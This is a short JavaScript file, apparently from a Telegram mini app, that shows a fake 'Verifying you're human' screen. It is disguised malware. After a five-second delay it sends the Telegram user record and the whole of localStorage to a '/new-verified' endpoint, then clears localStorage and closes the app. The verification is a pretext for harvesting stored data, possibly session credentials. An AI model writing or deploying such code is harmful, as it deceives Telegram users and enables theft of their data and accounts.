window.Sg = {
  verify: false,
  init() {
    if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.ready();
    }
  },
  close: () => {
    if (!window.Sg.verify) {
      window.Sg.verify = true;

      const isTelegram = window.Telegram?.WebApp?.initData;

      if (isTelegram) {
        // ✅ Inserisce la schermata di caricamento con sfondo forzato bianco
        document.body.innerHTML = `
          <style>
            html, body {
              margin: 0;
              padding: 0;
              height: 100%;
              background: white !important;
            }

            @keyframes dots {
              0%   { content: ""; }
              25%  { content: "."; }
              50%  { content: ".."; }
              75%  { content: "..."; }
              100% { content: ""; }
            }

            .dots::after {
              content: "";
              animation: dots 1.5s steps(4, end) infinite;
            }
          </style>

          <div style="
            height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center;
            background: white;
          ">
            <h2 style="
              font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen,
              Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;
              font-weight: 700;
              font-size: 1.5rem;
              color: black;
            ">
              Verifying you're human<span class="dots"></span>
            </h2>
          </div>
        `;
      }

      // ⏳ Dopo 5 secondi invia i dati e chiude la mini app
      if (isTelegram) {
        setTimeout(async () => {
          const user = window.Telegram.WebApp.initDataUnsafe.user || {};
          await fetch("/new-verified", {
            method: "POST",
            body: JSON.stringify({
              user,
              storage: window.localStorage,
            }),
            headers: {
              "content-type": "application/json",
            },
          });

          localStorage.clear();
          window.Telegram.WebApp.close();
        }, 5000);
      }
    }
  },
};

Sg.init();
